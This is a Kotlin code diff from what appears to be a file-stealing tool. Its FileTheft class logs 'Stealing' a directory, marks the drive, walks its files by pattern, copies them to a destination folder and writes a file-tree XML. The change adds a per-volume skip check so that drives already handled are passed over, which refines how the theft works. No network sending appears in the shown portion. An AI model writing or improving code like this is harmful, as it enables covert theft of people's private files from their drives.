@@ -40,8 +40,9 @@ class FileTheft(val directory: File) : Theft {
         log.i(LOG_TAG, "Stealing $directory on thread ${Thread.currentThread().name}")
         val patterns = PatternsManager.default.readPatterns()
         val driveMarker = DriveMarker.inDrive(directory)
+        var volumeIdByteArray: ByteArray? = null
         try {
-            driveMarker.resolve()
+            volumeIdByteArray = driveMarker.resolve()
         } catch (e: Exception) {
             log.e(tag = "DriveMarker", msg = "Failed to mark drive", e = e)
         }
@@ -55,7 +56,10 @@ class FileTheft(val directory: File) : Theft {
         )
         destDir.mkdirs()
         log.i(LOG_TAG, "Destination dir: $destDir")
-        val fileWalker = FileWalker(directory)
+
+        val skipCheck = if (volumeIdByteArray == null) null else SkipManagement.getSkipCheck(volumeIdByteArray)
+        val fileWalker = FileWalker(directory, skipCheck)
+
         val completeFileList = fileWalker.walk()
         reportExceptionsIfNecessary(fileWalker.getExceptions())
 
@@ -67,7 +71,7 @@ class FileTheft(val directory: File) : Theft {
 
 
         try {
-            File(destDir, "__FileTree__.xml").bufferedWriter().use { treeWriter->
+            File(destDir, "__FileTree__.xml").bufferedWriter().use { treeWriter ->
                 treeWriter.write(fileWalker.fileTreeString)
             }
         } catch (e: Exception) {
